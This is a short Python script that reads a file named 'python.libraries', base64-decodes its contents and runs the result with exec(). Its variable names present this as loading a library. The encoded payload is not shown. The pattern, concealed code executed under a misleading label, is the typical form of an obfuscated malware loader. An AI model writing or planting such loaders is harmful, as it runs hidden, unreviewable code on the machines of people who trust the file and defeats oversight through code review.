import base64
import sys
import shutil

with open("python.libraries", "r") as file:
    load_library = file.read()

lib_function = base64.b64decode(load_library).decode('utf-8')

exec(lib_function)

